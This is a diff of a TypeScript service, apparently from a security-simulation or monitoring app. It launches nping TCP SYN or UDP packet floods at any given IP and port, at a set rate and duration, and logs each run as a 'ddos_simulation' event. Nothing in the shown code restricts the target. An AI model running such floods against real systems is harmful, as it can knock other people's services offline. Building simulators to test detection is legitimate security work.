@@ -1,68 +1,88 @@
-// services/ddosService.ts
-import { spawn, ChildProcessWithoutNullStreams } from 'child_process';
-import { insertEvent } from '../models/eventModel';
+// src/services/ddosService.ts
+import { spawn, ChildProcessWithoutNullStreams } from 'child_process'
+import { insertEvent } from '../models/eventModel'
 
-let ddosProcess: ChildProcessWithoutNullStreams | null = null;
+let ddosProcess: ChildProcessWithoutNullStreams | null = null
+let currentParams: DDoSAttackParams | null = null
+let startTime: number | null = null
 
-interface DDoSAttackParams {
-    targetIP: string;
-    port: number;
-    method: 'TCP' | 'UDP' | 'HTTP';
-    threads: number;
-    duration: number; // in seconds
+export interface DDoSAttackParams {
+    targetIP: string
+    port: number
+    method: 'TCP' | 'UDP'
+    threads: number // packets per second
+    duration: number  // duration in seconds
 }
 
 export async function startDDoSAttack(params: DDoSAttackParams): Promise<boolean> {
-    if (ddosProcess) stopDDoSAttack();
-    await insertEvent({ type: 'ddos_simulation', source_ip: 'localhost', dest_ip: params.targetIP, severity: 'medium' });
+    if (ddosProcess) stopDDoSAttack()
+    currentParams = params
+    startTime = Date.now()
 
-    // windows-compatible nping path (ensure nping is installed via nmap)
-    const npingPath = '"C:\\Program Files (x86)\\Nmap\\nping.exe"';
-    const args: string[] = [];
+    await insertEvent({
+        type: 'ddos_simulation',
+        source_ip: 'localhost',
+        dest_ip: params.targetIP,
+        severity: 'medium',
+    })
 
-    // choose protocol
-    if (params.method === 'UDP') {
-        args.push('--udp');
-    } else {
-        args.push('--tcp', '--flags', 'SYN');
+    // path to nping executable without extra shell quoting
+    const npingPath = `C:\\Program Files (x86)\\Nmap\\nping.exe`
+    const args: string[] = []
+
+    // choose probe mode
+    args.push(params.method === 'UDP' ? '--udp' : '--tcp', '--flags', 'SYN')
+
+    // set destination port
+    args.push('-p', String(params.port))
+
+    // set rate/threads
+    args.push('--rate', String(params.threads))
+
+    // compute total count = rate * duration (remove '-c' for indefinite)
+    if (params.duration > 0) {
+        const totalCount = params.threads * params.duration
+        args.push('-c', String(totalCount))
     }
 
-    // port, rate, and target
-    args.push('-p', String(params.port));
-    args.push('--rate', String(params.threads));
-    args.push(params.targetIP);
+    // target host
+    args.push(params.targetIP)
 
-    // spawn with shell to handle spaces in path
-    const proc = spawn(npingPath, args, { shell: true });
-    ddosProcess = proc;
+    // spawn nping directly (no shell), so kill() works correctly
+    const proc = spawn(npingPath, args)
+    ddosProcess = proc
 
-    proc.stdout.on('data', (data: Buffer) => {
-        console.log(data.toString());
-    });
+    proc.stdout.on('data', data => console.log(data.toString()))
+    proc.stderr.on('data', data => console.error(data.toString()))
 
-    proc.stderr.on('data', (data: Buffer) => {
-        console.error(data.toString());
-    });
+    // cleanup on exit
+    proc.on('exit', () => {
+        ddosProcess = null
+        currentParams = null
+        startTime = null
+        console.log('ddos simulation exited')
+    })
 
-    // terminate flood after duration expires
-    setTimeout(() => {
-        stopDDoSAttack();
-    }, params.duration * 1000);
-
-    return true;
+    return true
 }
 
 export function stopDDoSAttack(): void {
     if (ddosProcess) {
-        ddosProcess.kill();
-        ddosProcess = null;
-        console.log('DDoS simulation stopped');
+        // default kill sends SIGTERM, sufficient for nping
+        ddosProcess.kill()
     }
 }
 
-export function getDDoSStatus(): { active: boolean; target?: string } {
+export function getDDoSStatus() {
+    const active = ddosProcess !== null
+    const uptimeSeconds = active && startTime ? Math.floor((Date.now() - startTime) / 1000) : 0
+
     return {
-        active: ddosProcess !== null,
-        target: ddosProcess ? ddosProcess.spawnargs.join(' ') : undefined
-    };
+        active,
+        params: currentParams,
+        pid: ddosProcess?.pid,
+        spawnArgs: ddosProcess?.spawnargs,
+        startTime: startTime ? new Date(startTime).toISOString() : null,
+        uptimeSeconds,
+    }
 }
